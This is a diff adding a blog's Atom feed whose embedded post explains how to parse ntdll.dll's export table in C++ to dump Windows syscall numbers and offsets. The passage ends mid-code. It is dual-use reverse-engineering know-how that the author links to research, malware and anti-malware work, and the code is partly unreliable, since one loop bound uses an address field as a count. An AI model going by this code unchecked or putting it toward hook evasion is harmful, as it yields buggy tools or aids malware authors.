@@ -1,0 +1,2355 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-04T10:34:47-05:00</updated><id>http://localhost:4000/</id><title type="html">Notebook</title><subtitle>Sharing notes and resources</subtitle><author><name>Josh Finley</name></author><entry><title type="html">Dumping Syscall Numbers and Offsets</title><link href="http://localhost:4000/sycall-dumping/" rel="alternate" type="text/html" title="Dumping Syscall Numbers and Offsets" /><published>2020-04-17T00:05:28-05:00</published><updated>2020-04-17T00:05:28-05:00</updated><id>http://localhost:4000/sycall-dumping</id><content type="html" xml:base="http://localhost:4000/sycall-dumping/">&lt;p&gt;Source code for this demonstration can be found &lt;a href=&quot;https://github.com/joshfinley/SyscallDumper/tree/v1.0&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; is the interface through which user-mode applications access the Windows kernel. &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; exports functions for every fundamental activity requring access to the domain of the kernel. Examples include interacting with the filesystem, virtual memory, physical devices, and more.&lt;/p&gt;
+
+&lt;p&gt;These functions are are esentially thin wrappers for passing information to the kernel for execution. With each syscall, &lt;code class=&quot;highlighter-rouge&quot;&gt;ntddl.dll&lt;/code&gt; sets up the information that the kernel needs, including placing the relevant &lt;em&gt;number&lt;/em&gt; of the system call into register &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt;. Following this, control is diverted to the kernel using the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction. A more complete description of this instruction can be found &lt;a href=&quot;https://www.felixcloutier.com/x86/syscall&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The following image shows an example of the disassembly of an &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; system call export:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;resources/ntdll_syscall_wrapper.png&quot; alt=&quot;resourcse system call disasm&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; itself exports over 2000 functions. On Windows 1909, 464 of these are these system call wrappers. The exports of a given executable can quickly be dumped using &lt;code class=&quot;highlighter-rouge&quot;&gt;dumpbin.exe&lt;/code&gt; as follows:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;dumpbin /exports C:\Windows\System32\ntdll.dll
+Microsoft (R) COFF/PE Dumper Version 14.24.28316.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+
+Dump of file C:\Windows\System32\ntdll.dll
+
+File Type: DLL
+
+  Section contains the following exports for ntdll.dll
+
+    00000000 characteristics
+     C1BB301 time date stamp
+        0.00 version
+           8 ordinal base
+        2381 number of functions
+        2380 number of names
+
+    ordinal hint RVA      name
+
+          9    0 0000C4D0 A_SHAFinal
+... (truncated)
+       2388  94B 00092220 wcstoul
+          8      0007C8C0 [NONAME]
+
+  Summary
+
+        1000 .00cfg
+        C000 .data
+        4000 .mrdata
+        F000 .pdata
+       47000 .rdata
+        1000 .reloc
+       70000 .rsrc
+      116000 .text
+        1000 RT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For almost any legitimate, day-to-day activities, a programmer will not interact with &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; directly, but instead will interact with other layers of wrappers around these fundamental system call functions as defined in libraries and subsystem APIs. But for research, malware, and anti-malware purposes, more precise details about the system call numbers are sometimes needed.&lt;/p&gt;
+
+&lt;h2 id=&quot;extracting-system-call-numbers-from-ntdlldl&quot;&gt;Extracting System Call Numbers From &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dl&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;Extracting the system calls from &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; is more an exercise in manual mapping than anything else. First, &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; is loaded with the &lt;code class=&quot;highlighter-rouge&quot;&gt;LOAD_LIBRARY_AS_DATAFILE&lt;/code&gt; flag:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// load ntdll
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadLibraryEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;System32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ntdll.dll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOAD_LIBRARY_AS_DATAFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetLastError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Error: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Without the&lt;code class=&quot;highlighter-rouge&quot;&gt;LOAD_LIBRARY_AS_DATAFILE&lt;/code&gt; flag, &lt;code class=&quot;highlighter-rouge&quot;&gt;DllMain&lt;/code&gt; would be called upon loading. In this situation, this needs to be avoided, and by using this flag, the library to simply be loaded as raw data.&lt;/p&gt;
+
+&lt;p&gt;With the raw data of &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; available, it can be parsed for exports:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// extract the dos header
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dosHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_DOS_HEADER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// extract the nt header
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ntHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_NT_HEADERS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_DOS_HEADER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e_lfanew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// extract the export directory
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_EXPORT_DIRECTORY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ntHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DataDirectory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IMAGE_DIRECTORY_ENTRY_EXPORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VirtualAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// set variables for export directory members
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPBYTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AddressOfFunctions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPBYTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AddressOfNames&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ord&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPBYTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AddressOfNameOrdinals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From here, the exports can simply be looped over to:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;find functions with names matching system calls&lt;/li&gt;
+  &lt;li&gt;extract the system call number:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// loop over exports
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AddressOfFunctions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;funcname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// identify &quot;Nt&quot; family functions
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;funcname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;// get the pointer to the function and calculate its RVA
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;funcaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPBYTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rva&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;funcaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ntHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isSyscall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;funcname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+            &lt;span class=&quot;c1&quot;&gt;// retrieve the syscall code number from the address
+&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objectcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;funcaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syscallcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objectcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                            
+            &lt;span class=&quot;c1&quot;&gt;// print the function's information
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rva&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syscallcode&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;funcname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
